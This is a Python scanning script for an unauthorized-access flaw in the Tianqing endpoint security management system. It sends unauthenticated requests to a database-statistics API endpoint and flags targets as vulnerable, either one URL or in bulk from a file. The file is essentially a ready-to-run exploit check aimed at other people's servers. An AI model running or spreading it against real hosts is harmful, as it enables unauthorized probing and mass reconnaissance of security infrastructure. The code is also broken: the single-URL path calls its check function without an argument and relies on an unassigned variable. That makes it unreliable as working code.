import requests
import json
import sys,getopt
import urllib3
urllib3.disable_warnings()


def title():
    print("[--------------------------------------------------]")
    print("[--------  天擎终端安全管理系统越权漏洞   ---------]")
    print("[--------     use: python3 tianqing.py      -------]")
    print("[--------        Author: Henry4E36          -------]")
    print("[--------------------------------------------------]")

def commit():
    url = ""
    try:

        opt, agrs = getopt.getopt(sys.argv[1:], "hu:f:", ["help", "url=","file="])
        for op, value in opt:
            if op == "-h" or op == "--help":
                print("""
            [-]   天擎终端安全管理系统越权漏洞 
            [-]   Options:
                     -h or --help      :   方法说明
                     -u or --url=      :   站点URL地址
                     -f or --file=     :   批量文件检测
                """)
                sys.exit(0)
            elif op == "-u" or op == "--url=":
                url = value
            elif op == "-f" or op == "--file=":
                file = value
            else:
                print("[-] 参数有误! eg:>>> python3 tianqing.py -u http://127.0.0.1")
                sys.exit(0)
        return url ,file

    except Exception as e:
        print("[-] 参数有误! eg:>>> python3 tianqing.py -u http://127.0.0.1")
        sys.exit(0)


def target_url(url):
    target_url = url +"/api/dbstat/gettablessize"
    try:
        res = requests.get(url=target_url,verify=False,timeout=5)
        content = json.loads(res.text)["reason"]
        if res.status_code == 200 and content == "success":
            print(f"\033[31m[!] 系统: {url} 存在越权漏洞\033[0m ")
        else:
            print(f"[!] 系统: {url} 不存在越权漏洞 ")
    except Exception as e:
        print("[!]  连接错误")

def scans(file):
    try:
        with open(f"{file}","r") as urls:
            for url in urls:
                if url[:4] != "http":
                    url = "http://" + url
                url = url.strip()
                target_url(url)
        urls.close()
    except Exception as e:
        print("[-] 文件不存在")


if __name__ == "__main__":
    title()
    url, file = commit()
    if url != "" and file != "":
        print("[-] 参数有误! eg:>>> python3 tianqing.py -u http://127.0.0.1")
    elif url != "":
        target_url()
    elif file != "":
        scans(file)




